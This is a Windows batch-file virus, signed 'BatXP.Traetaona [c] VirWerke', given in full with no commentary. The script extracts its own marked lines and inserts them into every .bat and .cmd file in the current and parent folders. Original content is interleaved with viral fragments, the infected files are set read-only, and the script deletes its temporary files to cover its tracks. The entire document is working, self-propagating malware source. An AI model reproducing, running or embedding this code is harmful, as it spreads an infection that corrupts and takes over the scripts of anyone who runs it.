::
@goto Trt1
::
:Trt1
set Traet=find
@goto Trt2
::
:Trt2
set Aona=copy
@goto Trt3
::
:Trt3 %Traetaona%
%Traetaona%@echo off
%Traet% "Traetaona"<%0>Traet.trt
%Traetaona%echo ::>Trt1.trt
%Traetaona%echo @goto Trt1>>Trt1.trt
%Traetaona%echo ::>Trt2.trt
%Traetaona%echo :Trt1>>Trt2.trt
%Traetaona%echo set Traet=find>>Trt2.trt
%Traetaona%echo @goto Trt2>>Trt2.trt
%Traetaona%echo ::>Trt3.trt
%Traetaona%echo :Trt2>>Trt3.trt
%Traetaona%echo set Aona=copy>>Trt3.trt
%Traetaona%echo @goto Trt3>>Trt3.trt
%Traetaona%echo ::>Trt4.trt
%Traetaona%echo ::>Trt5.trt
%Traetaona%echo :Trt4>>Trt5.trt
%Traetaona%echo cls>>Trt5.trt
%Traetaona%attrib +r %0>nul
%Traetaona%%Aona% *.bat *.bat.brt>nul
%Traetaona%%Aona% ..\\*.bat ..\\*.bat.brt>nul
%Traetaona%%Aona% *.cmd *.cmd.brt>nul
%Traetaona%%Aona% ..\\*.cmd ..\\*.cmd.brt>nul
%Traetaona%for %%q in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%q"+Trt1.trt "%%q">nul
%Traetaona%for %%w in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%w"+"%%w.brt" "%%w">nul
%Traetaona%for %%e in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%e"+Trt2.trt "%%e">nul
%Traetaona%for %%r in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%r"+"%%r.brt" "%%r">nul
%Traetaona%for %%t in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%t"+Trt3.trt "%%t">nul
%Traetaona%for %%y in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%y"+"%%y.brt" "%%y">nul
%Traetaona%for %%u in (Trt4.trt) do %Aona% "%%u"+Traet.trt "%%u">nul
%Traetaona%for %%i in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%i"+Trt4.trt "%%i">nul
%Traetaona%for %%o in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%o"+"%%o.brt" "%%o">nul
%Traetaona%for %%p in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do %Aona% "%%p"+Trt5.trt "%%p">nul
%Traetaona%for %%a in (*.bat, *.cmd, ..\\*.bat, ..\\*.cmd) do attrib +r "%%a">nul
%Traetaona%for %%s in (*.trt) do del %%s>nul
%Traetaona%for %%d in (*.brt, ..\\*.brt) do del "%%d">nul
@goto Trt4 %Traetaona%
:: BatXP.Traetaona [c] VirWerke
::
:Trt4
cls
